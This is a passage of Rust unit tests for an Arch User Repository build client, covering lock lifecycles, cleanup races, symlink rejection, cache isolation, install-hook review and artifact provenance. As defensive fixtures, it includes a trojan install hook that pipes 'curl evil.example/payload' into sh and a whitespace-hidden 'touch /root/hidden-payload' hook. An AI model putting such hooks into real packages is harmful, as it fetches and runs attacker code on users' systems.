        Some(&crate::core::security::ValidationError::PackageNameStartsWithDash)
    );
    assert_eq!(
        in_flight,
        AHashSet::from_iter(["unrelated-package".to_owned()])
    );
    assert!(!client.build_dir.exists());
    assert_eq!(std::fs::read_dir(owner.path())?.count(), 0);
    Ok(())
}

#[tokio::test]
async fn lifecycle_lease_excludes_cleanup_until_all_builds_finish() {
    use std::os::unix::fs::MetadataExt;
    let directory = tempfile::tempdir().unwrap();
    let client = AurClient {
        build_dir: directory.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let first = client.acquire_build_lifecycle().await.unwrap();
    let second = client.acquire_build_lifecycle().await.unwrap();
    let inherited = second.duplicate_descriptor().unwrap();
    std::fs::create_dir_all(&client.build_dir).unwrap();
    let marker = client.build_dir.join("active-build");
    std::fs::write(&marker, b"in progress").unwrap();
    assert!(client.clean_all().is_err());
    assert!(marker.exists());
    drop(first);
    assert!(client.clean_all().is_err());
    drop(second);
    let lock_path = directory.path().join("aur.lifecycle.lock");
    let inode = lock_path.metadata().unwrap().ino();
    client.clean_all().unwrap();
    assert!(!marker.exists());
    assert_eq!(lock_path.metadata().unwrap().ino(), inode);
    drop(inherited);
    let cleanup =
        BuildLifecycleLease::try_exclusive(client.open_lifecycle_lock().unwrap()).unwrap();
    assert!(client.acquire_build_lifecycle().await.is_err());
    drop(cleanup);
    assert!(client.acquire_build_lifecycle().await.is_ok());
}

#[tokio::test]
async fn cancelled_blocking_work_keeps_cache_lease_until_completion() {
    let directory = tempfile::tempdir().unwrap();
    let client = AurClient {
        build_dir: directory.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let worker_client = client.clone();
    let (started_tx, started_rx) = tokio::sync::oneshot::channel();
    let (release_tx, release_rx) = std::sync::mpsc::channel();
    let (completed_tx, completed_rx) = tokio::sync::oneshot::channel::<()>();
    let worker = tokio::spawn(async move {
        worker_client
            .blocking_build_work(move || {
                started_tx.send(()).unwrap();
                release_rx.recv().unwrap();
                Ok(completed_tx)
            })
            .await
    });
    started_rx.await.unwrap();
    worker.abort();
    assert!(worker.await.unwrap_err().is_cancelled());
    let cleanup_while_running = client.clean_all();
    release_tx.send(()).unwrap();
    // A dropped blocking task result releases this sender after its lease.
    assert!(completed_rx.await.is_err());
    assert!(
        cleanup_while_running.is_err(),
        "cleanup removed an active blocking job's cache"
    );
    client.clean_all().unwrap();
}

#[test]
fn lifecycle_lock_rejects_links() {
    let directory = tempfile::tempdir().unwrap();
    let client = AurClient {
        build_dir: directory.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let target = directory.path().join("target");
    let lock = directory.path().join("aur.lifecycle.lock");
    std::fs::write(&target, b"unchanged").unwrap();
    std::os::unix::fs::symlink(&target, &lock).unwrap();
    assert!(client.open_lifecycle_lock().is_err());
    std::fs::remove_file(&lock).unwrap();
    std::fs::hard_link(&target, &lock).unwrap();
    assert!(client.open_lifecycle_lock().is_err());
    assert_eq!(std::fs::read(&target).unwrap(), b"unchanged");
}

#[test]
fn rollback_worktrees_are_unique_for_the_same_package_base() -> Result<()> {
    let work = tempfile::tempdir()?;
    let first = AurClient::begin_rollback_worktree(work.path(), "example")?;
    let second = AurClient::begin_rollback_worktree(work.path(), "example")?;
    for checkout in [&first, &second] {
        assert_eq!(
            std::fs::metadata(checkout.path())?.permissions().mode() & 0o777,
            0o700,
            "rollback checkouts must be private at creation"
        );
    }
    assert!(
        first
            .path()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .starts_with("example-")
    );
    assert!(
        second
            .path()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .starts_with("example-")
    );
    assert_ne!(first.path(), second.path());
    drop(first);
    assert!(second.path().is_dir());
    Ok(())
}

#[test]
fn rollback_failure_removes_its_checkout() -> Result<()> {
    let work = tempfile::tempdir()?;
    let attempt = || -> Result<()> {
        let checkout = AurClient::begin_rollback_worktree(work.path(), "example")?;
        std::fs::write(checkout.path().join("PKGBUILD"), b"partial clone")?;
        anyhow::bail!("historical version not found");
    };
    assert!(attempt().is_err());
    assert_eq!(
        std::fs::read_dir(work.path())?.count(),
        0,
        "failed checkout must not leak"
    );
    Ok(())
}

#[tokio::test]
async fn rollback_cancellation_preserves_other_checkouts_and_logs() -> Result<()> {
    let root = tempfile::tempdir()?;
    let work = root.path().join("_rollback");
    let logs = root.path().join("_logs");
    std::fs::create_dir_all(&work)?;
    std::fs::create_dir_all(&logs)?;
    let log = logs.join("example.log");
    std::fs::write(&log, b"diagnostic evidence")?;
    let surviving = AurClient::begin_rollback_worktree(&work, "example")?;
    let cancelled = AurClient::begin_rollback_worktree(&work, "example")?;
    let cancelled_path = cancelled.path().to_path_buf();
    std::fs::write(cancelled.path().join("PKGBUILD"), b"partial")?;
    let (ready, started) = tokio::sync::oneshot::channel();
    let task = tokio::spawn(async move {
        let _checkout = cancelled;
        let _ = ready.send(());
        std::future::pending::<()>().await;
    });
    started.await?;
    task.abort();
    assert!(task.await.expect_err("cancelled rollback").is_cancelled());
    assert!(!cancelled_path.exists());
    assert!(surviving.path().is_dir());
    assert_eq!(std::fs::read(log)?, b"diagnostic evidence");
    Ok(())
}

#[test]
fn rollback_errors_do_not_contain_literal_escape_text() {
    let not_found = historical_version_not_found_message("example", "1.0-1");
    assert!(!not_found.contains('\\'));

    let build_failed = AurClient::historical_build_failure_message(
        "example",
        "1.0-1",
        Path::new("/var/log/omg/example.log"),
    );
    assert!(build_failed.contains('\n'));
    assert!(!build_failed.contains("\\n"));
    assert!(!build_failed.contains("\\\\"));
}

#[tokio::test]
async fn cleanup_preserves_active_builds_and_the_lifecycle_inode() -> Result<()> {
    use std::os::unix::fs::MetadataExt;

    let directory = tempfile::tempdir()?;
    let client = AurClient {
        build_dir: directory.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let checkout = client.build_dir.join("fixture");
    std::fs::create_dir_all(&checkout)?;
    std::fs::write(checkout.join("PKGBUILD"), b"reviewed source")?;
    std::fs::write(
        checkout.join(".SRCINFO"),
        b"pkgbase = fixture\npkgver = 1\npkgrel = 1\narch = any\npkgname = fixture\n",
    )?;
    let first = AuthorizedBuild {
        lifecycle_guard: client.acquire_build_lifecycle().await?,
        package: "fixture".into(),
        requested_outputs: vec!["fixture".into()],
        reviewed_digest: ReviewedSource::capture(&checkout)?,
    };
    let second = client.clone().acquire_build_lifecycle().await?;
    let lifecycle_path = client.build_dir.with_added_extension("lifecycle.lock");
    let inode = std::fs::metadata(&lifecycle_path)?.ino();
    let package_guard = client.acquire_package_base_file_lock("fixture").await?;
    let package_inode = package_guard.metadata()?.ino();
    let source = checkout.join("PKGBUILD");

    assert!(
        client.clean_all().is_err(),
        "cleanup must reject active builders"
    );
    assert_eq!(std::fs::read(&source)?, b"reviewed source");
    assert_eq!(
        std::fs::metadata(client.build_dir.join("_locks/fixture.lock"))?.ino(),
        package_inode
    );
    drop(package_guard);
    drop(first);
    assert!(
        client.clean_all().is_err(),
        "remaining shared owner must still block cleanup"
    );
    drop(second);

    client.clean_all()?;
    assert!(client.build_dir.is_dir());
    assert_eq!(std::fs::read_dir(&client.build_dir)?.count(), 0);
    assert_eq!(std::fs::metadata(&lifecycle_path)?.ino(), inode);
    let _next_build = client.acquire_build_lifecycle().await?;
    assert!(
        client.clean_all().is_err(),
        "a new build must use the same lock inode"
    );
    Ok(())
}

#[tokio::test]
async fn cleanup_ownership_blocks_new_builds_and_other_cleaners() -> Result<()> {
    let directory = tempfile::tempdir()?;
    let client = AurClient {
        build_dir: directory.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let cleaner = BuildLifecycleLease::try_exclusive(client.open_lifecycle_lock()?)?;
    assert!(client.acquire_build_lifecycle().await.is_err());
    assert!(client.clean_all().is_err());
    assert!(!client.build_dir.exists());
    drop(cleaner);
    let _builder = client.acquire_build_lifecycle().await?;
    Ok(())
}

#[tokio::test]
async fn cancelled_build_releases_cleanup_ownership() -> Result<()> {
    if crate::core::testing::run_isolated_test(
        "package_managers::aur::client::tests::cancelled_build_releases_cleanup_ownership",
    ) {
        return Ok(());
    }
    let directory = tempfile::tempdir()?;
    let client = AurClient {
        build_dir: directory.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let guard = client.acquire_build_lifecycle().await?;
    std::fs::create_dir_all(&client.build_dir)?;
    std::fs::write(client.build_dir.join("partial"), b"partial")?;
    let (ready, started) = tokio::sync::oneshot::channel();
    let task = tokio::spawn(async move {
        let _guard = guard;
        let _ = ready.send(());
        std::future::pending::<()>().await;
    });
    started.await?;
    assert!(client.clean_all().is_err());
    task.abort();
    assert!(task.await.expect_err("cancelled build task").is_cancelled());
    client.clean_all()?;
    assert_eq!(std::fs::read_dir(&client.build_dir)?.count(), 0);
    Ok(())
}

#[test]
fn lifecycle_lock_rejects_symlinks_and_hardlinks() -> Result<()> {
    let directory = tempfile::tempdir()?;
    let client = AurClient {
        build_dir: directory.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let target = directory.path().join("unrelated");
    std::fs::write(&target, b"keep")?;
    let lock_path = client.build_dir.with_added_extension("lifecycle.lock");
    std::os::unix::fs::symlink(&target, &lock_path)?;
    assert!(client.open_lifecycle_lock().is_err());
    std::fs::remove_file(&lock_path)?;
    std::fs::hard_link(&target, &lock_path)?;
    assert!(client.open_lifecycle_lock().is_err());
    assert_eq!(std::fs::read(target)?, b"keep");
    Ok(())
}

#[tokio::test]
async fn package_base_file_locks_live_under_the_build_directory() {
    let directory = private_fixture_dir().unwrap();
    let client = AurClient {
        build_dir: directory.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };

    let guard = client
        .acquire_package_base_file_lock("shared-base")
        .await
        .expect("package-base file lock");

    let lock_path = client.build_dir.join("_locks/shared-base.lock");
    assert!(lock_path.is_file());
    assert_eq!(
        std::fs::metadata(lock_path).unwrap().permissions().mode() & 0o777,
        0o600,
        "package-base coordination files must be private at creation"
    );
    drop(guard);
}

#[tokio::test]
async fn package_base_file_locks_reject_symlinks_and_hardlinks() -> Result<()> {
    use std::os::unix::fs::DirBuilderExt;

    let directory = private_fixture_dir()?;
    let client = AurClient {
        build_dir: directory.path().join("aur"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let locks = client.build_dir.join("_locks");
    std::fs::DirBuilder::new()
        .recursive(true)
        .mode(0o700)
        .create(&locks)?;
    let ordinary = client.acquire_package_base_file_lock("ordinary").await?;
    drop(ordinary);
    let target = directory.path().join("unrelated");
    std::fs::write(&target, b"unrelated inode")?;
    let lock_path = locks.join("shared-base.lock");
    std::os::unix::fs::symlink(&target, &lock_path)?;
    assert!(
        client
            .acquire_package_base_file_lock("shared-base")
            .await
            .is_err(),
        "a package-base lock must not follow a symlink to an unrelated inode"
    );
    std::fs::remove_file(&lock_path)?;
    std::fs::hard_link(&target, &lock_path)?;
    assert!(
        client
            .acquire_package_base_file_lock("shared-base")
            .await
            .is_err(),
        "a package-base lock must not share an unrelated hardlinked inode"
    );
    assert_eq!(std::fs::read(target)?, b"unrelated inode");
    Ok(())
}

#[test]
fn cloned_clients_serialize_work_for_the_same_package_base() {
    let directory = tempfile::tempdir().unwrap();
    let client = AurClient {
        build_dir: directory.path().to_path_buf(),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    let cloned = client.clone();

    let first = client.package_base_lock("shared-base");
    let second = cloned.package_base_lock("shared-base");
    let unrelated = cloned.package_base_lock("unrelated-base");
    assert!(Arc::ptr_eq(&first, &second));
    assert!(!Arc::ptr_eq(&first, &unrelated));

    let guard = first.try_lock().expect("first package-base lock");
    assert!(second.try_lock().is_err());
    assert!(unrelated.try_lock().is_ok());
    drop(guard);
    assert!(second.try_lock().is_ok());
}

#[test]
fn sandbox_cache_mounts_include_configured_compiler_caches() {
    let directory = tempfile::tempdir().unwrap();
    let cache_base = directory.path().join("cache");
    let ccache = cache_base.join("ccache");
    let sccache = cache_base.join("sccache");
    std::fs::create_dir_all(&ccache).unwrap();
    std::fs::create_dir_all(&sccache).unwrap();

    let mounts = AurClient::sandbox_cache_mounts(&cache_base, &[ccache, sccache]).unwrap();

    assert_eq!(
        mounts,
        vec![cache_base.join("ccache"), cache_base.join("sccache")]
    );

    let outside = directory.path().join("outside");
    std::fs::create_dir(&outside).unwrap();
    assert!(AurClient::sandbox_cache_mounts(&cache_base, &[outside]).is_err());
}

#[tokio::test]
async fn test_makepkg_env_sanitization() {
    let client = AurClient::new().expect("test settings must load");
    let dir = tempfile::tempdir().expect("temp dir");
    let pkg_dir = dir.path().join("mypkg");
    std::fs::create_dir(&pkg_dir).expect("pkg dir");

    let env = client
        .makepkg_env(&pkg_dir)
        .await
        .expect("makepkg env must be constructed");
    assert!(
        env.builddir.starts_with(paths::cache_dir()),
        "build dir must live under the omg cache directory, got {}",
        env.builddir.display()
    );
    assert!(
        !env.builddir.starts_with(std::env::temp_dir()),
        "build dir must never be under world-writable /tmp, got {}",
        env.builddir.display()
    );
    assert!(
        env.builddir.ends_with("mypkg"),
        "build dir must be named after the package, got {}",
        env.builddir.display()
    );
}

#[test]
fn cache_key_binds_auxiliary_files() {
    let dir = tempfile::tempdir().unwrap();
    let client = AurClient {
        build_dir: dir.path().join("build"),
        settings: Settings::default(),
        package_base_locks: Arc::new(dashmap::DashMap::new()),
    };
    std::fs::write(dir.path().join("PKGBUILD"), "pkgname=demo\n").unwrap();
    std::fs::write(dir.path().join(".SRCINFO"), "pkgbase = demo\n").unwrap();
    std::fs::write(dir.path().join("fix.patch"), "original").unwrap();
    let invocation = tempfile::tempdir().unwrap();
    let archive = invocation.path().join("demo-1-1-any.pkg.tar.gz");
    write_pkg_archive(
        &archive,
        "pkgname = demo\npkgbase = demo\npkgver = 1-1\n",
        None,
    );
    let inspection = artifact_inspector::inspect_archive(&archive)
        .unwrap()
        .into_inspection();
    let env = MakepkgEnv {
        pkgdest: invocation.path().join("pkg"),
        srcdest: invocation.path().join("src"),
        builddir: invocation.path().join("build"),
        _invocation: invocation,
        makeflags: String::new(),
        compiler_cache_dirs: Vec::new(),
        extra_env: Vec::new(),
        pgp_home: None,
    };
    let source_and_key = || {
        let source = ReviewedSource::capture(dir.path()).unwrap();
        let key = client.paired_build_cache_key(&source, &env, std::slice::from_ref(&inspection));
        (source.digest, key)
    };
    let before = source_and_key();
    assert_eq!(before, source_and_key());
    std::fs::write(dir.path().join("fix.patch"), "modified").unwrap();
    let modified = source_and_key();
    assert_ne!(before.0, modified.0);
    assert_ne!(before.1, modified.1);
    std::fs::write(dir.path().join("fix.patch"), "original").unwrap();
    assert_eq!(before, source_and_key());
}

#[tokio::test]
async fn makepkg_invocations_isolate_every_writable_cache() {
    let mut client = AurClient::new().unwrap();
    let dir = tempfile::tempdir().unwrap();
    client.settings.aur.enable_ccache = true;
    client.settings.aur.enable_sccache = true;
    client.settings.aur.pkgdest = Some(dir.path().to_owned());
    client.settings.aur.srcdest = Some(dir.path().to_owned());
    client.settings.aur.ccache_dir = Some(dir.path().to_owned());
    client.settings.aur.sccache_dir = Some(dir.path().to_owned());
    let first = client.makepkg_env(dir.path()).await.unwrap();
    let second = client.makepkg_env(dir.path()).await.unwrap();
    for (left, right) in [
        (&first.pkgdest, &second.pkgdest),
        (&first.srcdest, &second.srcdest),
        (&first.builddir, &second.builddir),
    ] {
        assert_ne!(left, right);
        assert!(!left.starts_with(dir.path()));
    }
    for left in &first.compiler_cache_dirs {
        assert!(!second.compiler_cache_dirs.contains(left));
        assert!(!left.starts_with(dir.path()));
    }
    let old_output = first.pkgdest.clone();
    drop(first);
    assert!(!old_output.exists());
}

#[test]
fn invocation_ownership_setup_uses_only_private_directory_handles() -> Result<()> {
    use std::os::unix::fs::{MetadataExt, PermissionsExt};
    let directory = tempfile::Builder::new()
        .permissions(std::fs::Permissions::from_mode(0o700))
        .tempdir()?;
    prepare_invocation_directory(directory.path(), None)?;
    let metadata = std::fs::metadata(directory.path())?;
    assert_eq!(metadata.mode() & 0o777, 0o700);
    let outside = tempfile::tempdir()?;
    std::fs::set_permissions(outside.path(), std::fs::Permissions::from_mode(0o755))?;
    assert!(prepare_invocation_directory(outside.path(), None).is_err());
    let link = directory.path().join("linked-directory");
    std::os::unix::fs::symlink(outside.path(), &link)?;
    assert!(prepare_invocation_directory(&link, None).is_err());
    if nix::unistd::geteuid().is_root() {
        let account = nix::unistd::User::from_name("nobody")?
            .context("root ownership regression needs an unprivileged nobody account")?;
        prepare_invocation_directory(directory.path(), Some((account.uid, account.gid)))?;
        let metadata = std::fs::metadata(directory.path())?;
        assert_eq!(metadata.uid(), account.uid.as_raw());
        assert_eq!(metadata.gid(), account.gid.as_raw());
        assert_eq!(metadata.mode() & 0o777, 0o700);
    }
    Ok(())
}

#[tokio::test]
async fn chroot_requires_explicit_host_code_consent_before_launch() -> Result<()> {
    let mut client = AurClient::new()?;
    client.settings.aur.allow_network = true;
    client.settings.aur.allow_unsafe_builds = false;
    let checkout = tempfile::tempdir()?;
    let env = client.makepkg_env(checkout.path()).await?;
    let error = client
        .run_chroot_build(checkout.path(), &env, "demo")
        .await
        .expect_err("network consent alone cannot authorize host recipe execution");
    assert!(error.to_string().contains("aur.allow_unsafe_builds"));
    Ok(())
}

#[tokio::test]
async fn reviewed_chroot_launch_waits_for_the_detached_helper() -> Result<()> {
    let state = tempfile::tempdir()?;
    let mut client = AurClient::new()?;
    client.build_dir = state.path().join("build");
    client.settings.aur.allow_network = true;
    client.settings.aur.allow_unsafe_builds = true;
    let env = client.makepkg_env(state.path()).await?;
    let status = client
        .run_chroot_build_with(state.path(), &env, "demo", |program| {
            if program == "pkgctl" {
                return crate::core::privilege::root_controlled_program_path("true");
            }
            assert_eq!(program, "setsid");
            crate::core::privilege::root_controlled_program_path(program)
        })
        .await?;
    assert!(status.success());
    Ok(())
}

#[test]
fn install_hook_review_fails_closed_and_preserves_long_lines() {
    let mut source = ReviewedSource {
        files: std::collections::BTreeMap::from([(
            PathBuf::from(".SRCINFO"),
            b"install = demo.install\n".to_vec(),
        )]),
        digest: String::new(),
        parsed_srcinfo: OnceLock::new(),
    };
    assert!(declared_install_hook_previews(&source).is_err());
    source.files.insert(
        PathBuf::from("demo.install"),
        vec![b'x'; MAX_PKGBUILD_REVIEW_BYTES + 1],
    );
    assert!(declared_install_hook_previews(&source).is_err());
    source
        .files
        .insert(PathBuf::from("demo.install"), vec![0xff]);
    assert!(declared_install_hook_previews(&source).is_err());
    let hook = format!("{}; touch /root/hidden-payload", " ".repeat(150));
    source
        .files
        .insert(PathBuf::from("demo.install"), hook.as_bytes().to_vec());
    let hooks = declared_install_hook_previews(&source).unwrap();
    let panel = pkgbuild_review_panel(
        "demo",
        "digest",
        "pkgname=demo",
        Path::new("PKGBUILD"),
        &[],
        &hooks,
        false,
    );
    assert!(panel.contains("touch /root/hidden-payload"));
}

#[tokio::test]
async fn fresh_outputs_never_fall_back_to_checkout_or_other_invocations() {
    let client = AurClient::new().unwrap();
    let checkout = tempfile::tempdir().unwrap();
    let first = client.makepkg_env(checkout.path()).await.unwrap();
    let second = client.makepkg_env(checkout.path()).await.unwrap();
    let write_archive = |directory: &Path, name: &str| {
        let path = directory.join(format!("{name}-1-1-any.pkg.tar.zst"));
        let encoder = zstd::Encoder::new(File::create(&path).unwrap(), 0).unwrap();
        let mut archive = tar::Builder::new(encoder);
        let info = format!("pkgname = {name}\npkgver = 1-1\npkgbase = demo\narch = any\n");
        let mut header = tar::Header::new_gnu();
        header.set_size(info.len() as u64);
        header.set_cksum();
        archive
            .append_data(&mut header, ".PKGINFO", info.as_bytes())
            .unwrap();
        archive.into_inner().unwrap().finish().unwrap();
        path
    };
    let poison = write_archive(checkout.path(), "demo");
    write_archive(&first.pkgdest, "demo");
    let names = ["demo".to_string()];
    assert!(
        AurClient::find_built_packages(checkout.path(), &second.pkgdest, &names)
            .await
            .is_err()
    );
    std::os::unix::fs::symlink(&poison, second.pkgdest.join(poison.file_name().unwrap())).unwrap();
    assert!(
        AurClient::find_built_packages(checkout.path(), &second.pkgdest, &names)
            .await
            .is_err()
    );
    std::fs::remove_file(second.pkgdest.join(poison.file_name().unwrap())).unwrap();
    let genuine = write_archive(&second.pkgdest, "demo");
    assert_eq!(
        AurClient::find_built_packages(checkout.path(), &second.pkgdest, &names)
            .await
            .unwrap(),
        vec![genuine]
    );
    let split = ["demo".to_string(), "libs".to_string()];
    write_archive(&first.pkgdest, "libs");
    assert!(
        AurClient::find_built_packages(checkout.path(), &second.pkgdest, &split)
            .await
            .is_err()
    );
    write_archive(&second.pkgdest, "libs");
    assert_eq!(
        AurClient::find_built_packages(checkout.path(), &second.pkgdest, &split)
            .await
            .unwrap()
            .len(),
        2
    );
    drop(first); // A failed invocation's output tree cannot feed a later build.
    let later = client.makepkg_env(checkout.path()).await.unwrap();
    assert!(
        AurClient::find_built_packages(checkout.path(), &later.pkgdest, &names)
            .await
            .is_err()
    );
}

#[test]
fn cache_key_requires_reviewable_srcinfo() {
    let dir = tempfile::tempdir().expect("temp dir");
    let pkg_dir = dir.path().join("mypkg");
    std::fs::create_dir(&pkg_dir).expect("pkg dir");
    std::fs::write(pkg_dir.join("PKGBUILD"), "pkgname=mypkg\n").expect("pkgbuild");

    let error = ReviewedSource::capture(&pkg_dir)
        .expect_err("missing .SRCINFO must not produce a source cache identity");
    assert_eq!(
        error.to_string(),
        "AUR review requires PKGBUILD and .SRCINFO"
    );
}

#[test]
fn cache_key_fails_when_srcinfo_is_unreadable() {
    use std::os::unix::fs::PermissionsExt;

    if crate::config::Settings::rerun_test_unprivileged(
        "package_managers::aur::client::tests::cache_key_fails_when_srcinfo_is_unreadable",
    ) {
        return;
    }
    assert!(
        !crate::core::is_root(),
        "permission fixture must not run as root"
    );

    let dir = tempfile::tempdir().expect("temp dir");
    let pkg_dir = dir.path().join("mypkg");
    std::fs::create_dir(&pkg_dir).expect("pkg dir");
    std::fs::write(pkg_dir.join("PKGBUILD"), "pkgname=mypkg\n").expect("pkgbuild");
    let srcinfo = pkg_dir.join(".SRCINFO");
    std::fs::write(&srcinfo, "pkgbase = mypkg\n").expect("srcinfo");
    let original = std::fs::metadata(&srcinfo)
        .expect("srcinfo metadata")
        .permissions();
    let mut permissions = original.clone();
    permissions.set_mode(0o000);
    std::fs::set_permissions(&srcinfo, permissions).expect("chmod");

    let result = ReviewedSource::capture(&pkg_dir);
    let denied = std::fs::read(&srcinfo).expect_err("fixture must enforce permission denial");
    assert_eq!(denied.kind(), std::io::ErrorKind::PermissionDenied);
    println!(
        "[omg-permission-fixture] test=package_managers::aur::client::tests::cache_key_fails_when_srcinfo_is_unreadable uid={} errno=PermissionDenied",
        nix::unistd::geteuid()
    );

    std::fs::set_permissions(&srcinfo, original).expect("restore chmod");

    let error = result.expect_err("unreadable .SRCINFO must fail closed");
    assert!(
        error.chain().any(|cause| cause
            .downcast_ref::<std::io::Error>()
            .is_some_and(|cause| cause.kind() == std::io::ErrorKind::PermissionDenied)),
        "production must retain the permission denial: {error:#}"
    );
}

#[test]
fn srcinfo_version_extracts_pkgver_pkgrel() {
    let srcinfo = "pkgbase = postgresql18\n\
         pkgver = 18.4\n\
         pkgrel = 1\n\
         pkgdesc = PostgreSQL\n\
         \n\
         pkgname = postgresql18\n";
    assert_eq!(srcinfo_version(srcinfo).as_deref(), Some("18.4-1"));
    // First occurrences win over later split-package duplicates.
    let dup = "pkgver = 1.0\npkgrel = 2\npkgname = a\npkgver = 9.9\n";
    assert_eq!(srcinfo_version(dup).as_deref(), Some("1.0-2"));
    assert_eq!(srcinfo_version("pkgname = x"), None);
    // makepkg emits epoch after pkgver/pkgrel in the pkgbase section.
    assert_eq!(
        srcinfo_version("pkgver = 1.0~rc1\npkgrel = 3\nepoch = 2"),
        Some("2:1.0~rc1-3".to_string())
    );
}

// ── SEC-R2-01: cached-artifact provenance ────────────────────────────

/// Build an architecture-independent fixture so provenance tests exercise
/// the selected identity/hook defect rather than missing architecture.
fn write_pkg_archive(path: &Path, pkginfo: &str, install: Option<&str>) {
    let pkginfo =
        format!("arch = any\npackager = Fixture Maintainer <fixture@example.invalid>\n{pkginfo}");
    let field = |name: &str| {
        pkginfo
            .lines()
            .find_map(|line| line.strip_prefix(&format!("{name} = ")))
            .unwrap_or_else(|| panic!("fixture is missing {name}"))
    };
    let buildinfo = format!(
        "format = 2\npkgname = {}\npkgbase = {}\npkgver = {}\npkgarch = any\npackager = Fixture Maintainer <fixture@example.invalid>\n",
        field("pkgname"),
        field("pkgbase"),
        field("pkgver")
    );
    let mut entries = vec![
        (".PKGINFO", pkginfo.as_bytes()),
        (".BUILDINFO", buildinfo.as_bytes()),
        (".MTREE", b"#mtree\n".as_slice()),
    ];
    if let Some(install) = install {
        entries.push((".INSTALL", install.as_bytes()));
    }
    write_tar_gz(path, &entries);
}

/// A reviewed checkout: `.SRCINFO` matching the PKGBUILD plus the
/// install script it declares.
fn provenance_pkg_dir(dir: &Path, srcinfo: &str, install_file: Option<(&str, &str)>) -> PathBuf {
    let pkg_dir = dir.join("mypkg");
    std::fs::create_dir(&pkg_dir).expect("pkg dir");
    let (base, rest) = srcinfo
        .split_once('\n')
        .expect("fixture starts with pkgbase");
    let srcinfo = format!("{base}\narch = any\n{rest}");
    std::fs::write(pkg_dir.join(".SRCINFO"), srcinfo).expect("srcinfo");
    if let Some((name, content)) = install_file {
        std::fs::write(pkg_dir.join(name), content).expect("install script");
    }
    pkg_dir
}

const LEGIT_INSTALL: &str = "pre_install() {\n  echo legit\n}\n";
const TROJAN_INSTALL: &str = "pre_install() {\n  curl evil.example/payload | sh\n}\n";

// Fixture-only code. The real archive reader and sealed output authorization
// must enforce each requested output's declared architecture independently.
fn assert_split_architecture_authorization(
    srcinfo: &str,
    requested: &[(&str, &str)],
    accepted: bool,
) -> Result<()> {
    assert!(
        !crate::core::is_root(),
        "archive fixture must use an ordinary UID"
    );
    let audit_dir = tempfile::tempdir()?;
    temp_env::with_var("OMG_DATA_DIR", Some(audit_dir.path()), || -> Result<()> {
        let source_dir = tempfile::tempdir()?;
        let archive_dir = private_fixture_dir()?;
        let pkgbuild = b"pkgbase=split\npkgname=(app docs)\npkgver=1.0\npkgrel=1\n";
        std::fs::write(source_dir.path().join("PKGBUILD"), pkgbuild)?;
        std::fs::write(source_dir.path().join(".SRCINFO"), srcinfo)?;
        let mut paths = Vec::new();
        for (name, architecture) in requested {
            let archive = archive_dir
                .path()
                .join(format!("{name}-1.0-1-{architecture}.pkg.tar.gz"));
            let pkginfo = format!(
                "pkgname = {name}\npkgbase = split\npkgver = 1.0-1\narch = {architecture}\n"
            );
            let buildinfo = format!(
                "format = 2\npkgname = {name}\npkgbase = split\npkgver = 1.0-1\npkgarch = {architecture}\n"
            );
            write_tar_gz(
                &archive,
                &[
                    (".PKGINFO", pkginfo.as_bytes()),
                    (".BUILDINFO", buildinfo.as_bytes()),
                    (".MTREE", b"#mtree\n"),
                ],
            );
            paths.push(archive);
        }
        let archive_before = paths
            .iter()
            .map(std::fs::read)
            .collect::<std::io::Result<Vec<_>>>()?;
        let source = ReviewedSource::capture(source_dir.path())?;
        let outputs = requested
            .iter()
            .map(|(name, _)| (*name).to_owned())
            .collect::<Vec<_>>();
        // This is the production final authorization boundary, before install.
        let authorized = AurClient::authorize_archives(&paths, &source, "split", &outputs, true);
        if accepted {
            let authorized = authorized?;
            assert_eq!(authorized.len(), requested.len());
            for (snapshot, (name, architecture)) in authorized.iter().zip(requested) {
                let identity = AurClient::cached_archive_identity(Path::new(&snapshot.handoff()))?
                    .expect("sealed accepted archive must retain its actual metadata");
                assert_eq!(identity.name, *name);
                assert_eq!(identity.base, "split");
                assert_eq!(identity.version, "1.0-1");
                assert_eq!(identity.architecture.as_deref(), Some(*architecture));
            }
        } else {
            let error = authorized.expect_err("wrong selected-output architecture must be refused");
            assert_eq!(
                error.to_string(),
                "AUR archive architecture is not approved for this host"
            );
        }
        // Retained legacy metadata check is cfg(test), not production reuse.
        let cached =
            AurClient::select_cached_artifacts(paths.clone(), &outputs, source_dir.path(), "split");
        if accepted {
            assert_eq!(cached, Some(paths.clone()));
        } else {
            assert_eq!(cached, None);
        }
        assert_eq!(std::fs::read(source_dir.path().join("PKGBUILD"))?, pkgbuild);
        assert_eq!(
            std::fs::read(source_dir.path().join(".SRCINFO"))?,
            srcinfo.as_bytes()
        );
        for (path, before) in paths.iter().zip(archive_before) {
            assert_eq!(std::fs::read(path)?, before);
        }
        Ok(())
    })
}

#[test]
fn split_output_architecture_rejects_sibling_any_for_host_output() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_sibling_any_for_host_output";
    if crate::core::testing::run_isolated_test(TEST)
        || crate::config::Settings::rerun_test_unprivileged(TEST)
    {
        return Ok(());
    }
    let host = super::super::utils::current_arch()
        .expect("supported Arch test host")
        .to_string();
    let srcinfo = format!(
        "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
    );
    assert_split_architecture_authorization(&srcinfo, &[("app", &host)], true)?;
    assert_split_architecture_authorization(&srcinfo, &[("app", "any")], false)
}

#[test]
fn split_output_architecture_rejects_base_host_for_any_override() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_base_host_for_any_override";
    if crate::core::testing::run_isolated_test(TEST)
